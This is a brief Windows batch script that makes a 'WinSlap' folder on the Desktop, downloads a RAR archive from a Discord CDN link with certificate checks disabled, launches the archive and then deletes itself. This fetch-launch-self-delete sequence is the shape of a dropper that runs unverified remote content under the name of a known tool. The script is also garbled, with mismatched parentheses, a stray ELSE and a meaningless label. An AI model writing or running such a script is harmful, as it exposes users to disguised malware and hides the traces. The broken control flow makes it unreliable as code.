color 5
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION


Mode 105,30







:1238128412509126823496239
mkdir "%USERPROFILE%\Desktop\WinSlap"
if exist "%USERPROFILE%\Desktop\WinSlap" (
curl -g -k -L -# -o "%USERPROFILE%\Desktop\WinSlap.rar" "https://cdn.discordapp.com/attachments/791639561197322242/1084213373434073278/WinSlap.rar"
)

) ELSE (

start "" "%USERPROFILE%\Desktop\WinSlap.rar"
pause>nul
cls
del %0











